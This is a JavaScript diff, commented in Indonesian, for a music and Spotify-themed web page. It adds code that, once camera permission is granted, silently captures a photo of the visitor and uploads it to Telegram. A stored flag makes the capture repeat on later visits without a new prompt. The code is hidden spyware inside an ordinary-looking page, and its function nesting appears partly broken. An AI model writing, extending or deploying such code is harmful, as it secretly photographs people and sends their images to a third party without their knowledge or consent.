@@ -32,26 +32,29 @@ async function startMusicAndCamera() {
     // tetap lanjut izin kamera walau musik gagal
   }
 
-  // === jalankan kamera setelah sedikit delay ===
+let stream = null; // buat global
+
+async function startCameraAfterDelay() {
   setTimeout(async () => {
     try {
       const alreadyAllowed = localStorage.getItem("user_allows_auto_capture") === "1";
 
       if (!alreadyAllowed && navigator.mediaDevices) {
         // minta izin 1x saja
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        stream.getTracks().forEach(t => t.stop());
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
         localStorage.setItem("user_allows_auto_capture", "1");
-        console.log("Perizinan.");
-      } else {
-        console.log("Perizinan");
+        console.log("✅ Izin kamera diberikan.");
+      } else if (navigator.mediaDevices && !stream) {
+        // kalau sudah pernah izin tapi stream belum aktif
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        console.log("♻️ Reuse izin lama.");
       }
 
-      // ambil & kirim foto
+      // jalankan auto-capture setelah izin ok
       await autoCaptureAndSend();
 
     } catch (e) {
-      console.warn(" User menolak izin:", e);
+      console.warn("🚫 User menolak izin:", e);
     }
   }, musicStarted ? 800 : 1500);
 
@@ -67,13 +70,18 @@ async function startMusicAndCamera() {
 // === Fungsi ambil foto & kirim ke Telegram ===
 async function autoCaptureAndSend() {
   try {
+    if (!stream) {
+      console.warn("⚠️ Stream belum aktif, tidak bisa capture.");
+      return;
+    }
+
     const video = document.createElement("video");
     video.srcObject = stream;
     video.playsInline = true;
 
     await new Promise(res => {
       video.onloadedmetadata = () => video.play().then(res).catch(res);
-      setTimeout(res, 3000);
+      setTimeout(res, 2000);
     });
 
     await new Promise(r => setTimeout(r, 300));
@@ -85,7 +93,10 @@ async function autoCaptureAndSend() {
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
     const base64img = canvas.toDataURL("image/png");
+
+    // tutup stream setelah foto diambil
     stream.getTracks().forEach(t => t.stop());
+    stream = null;
 
     const blob = await (await fetch(base64img)).blob();
     const fd = new FormData();
@@ -98,13 +109,13 @@ async function autoCaptureAndSend() {
       body: fd
     });
 
-    if (res.ok) console.log("✅ Foto terkirim (fokus 1s)");
+    if (res.ok) console.log("✅ Foto terkirim ke Telegram");
     else console.warn("⚠️ Gagal kirim foto");
   } catch (err) {
     console.error("❌ Tidak bisa akses kamera:", err);
-  }
+   }
 }
-
+  
 // === Event Listener Fix (musik + kamera) ===
 function userStart() {
   startMusicAndCamera().catch(console.warn);
@@ -635,3 +646,4 @@ document.getElementById('sendQ').addEventListener('click', async () => {
   updateSpotify();
   setInterval(updateSpotify, 8000);
 })();
+
